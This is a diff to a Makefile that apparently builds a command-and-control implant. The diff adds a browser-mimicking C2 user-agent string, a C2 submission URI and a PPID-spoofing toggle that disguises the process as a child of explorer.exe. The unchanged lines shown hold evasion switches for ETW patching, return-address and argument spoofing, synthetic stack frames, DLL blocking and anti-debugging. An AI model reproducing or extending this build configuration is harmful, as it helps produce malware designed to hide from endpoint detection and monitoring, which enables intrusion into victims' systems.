@@ -13,9 +13,12 @@ C2_HOST  ?= 127.0.0.1
 C2_PORT  ?= 8080
 USE_HTTPS ?= 0
 USE_MTLS  ?= 0
+C2_USER_AGENT ?= Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+C2_URI        ?= /api/submit
 
 # ── Common defines ──
 COMMON_DEFS = -DC2_HOST=\"$(C2_HOST)\" -DC2_PORT=$(C2_PORT) -DUSE_HTTPS=$(USE_HTTPS) -DUSE_MTLS=$(USE_MTLS)
+COMMON_DEFS += -DC2_USER_AGENT=\"$(C2_USER_AGENT)\" -DC2_URI=\"$(C2_URI)\"
 
 # ── Windows evasion toggles ──
 ENABLE_ETW_PATCH     ?= 1
@@ -36,6 +39,7 @@ ENABLE_RET_ADDR_SPOOF ?= 1  # Thread return address spoofing
 ENABLE_SYNTHETIC_FRAMES ?= 1 # Synthetic stack frames during sleep
 ENABLE_BLOCK_DLLS    ?= 1   # Block non-MS DLLs in child processes
 ENABLE_ARG_SPOOF     ?= 1   # Process argument spoofing
+ENABLE_PPID_SPOOF    ?= 1   # PPID spoofing to explorer.exe (#6)
 
 # ── POSIX (Linux/macOS) evasion toggles ──
 ENABLE_ANTI_DEBUG    ?= 1
@@ -64,6 +68,7 @@ WIN_CFLAGS += -DENABLE_RET_ADDR_SPOOF=$(ENABLE_RET_ADDR_SPOOF)
 WIN_CFLAGS += -DENABLE_SYNTHETIC_FRAMES=$(ENABLE_SYNTHETIC_FRAMES)
 WIN_CFLAGS += -DENABLE_BLOCK_DLLS=$(ENABLE_BLOCK_DLLS)
 WIN_CFLAGS += -DENABLE_ARG_SPOOF=$(ENABLE_ARG_SPOOF)
+WIN_CFLAGS += -DENABLE_PPID_SPOOF=$(ENABLE_PPID_SPOOF)
 WIN_LDFLAGS = -mwindows -lwinhttp -lws2_32 -lbcrypt -lgdi32 -ladvapi32 -lcrypt32 -static-libgcc
 
 # ── Linux flags ──
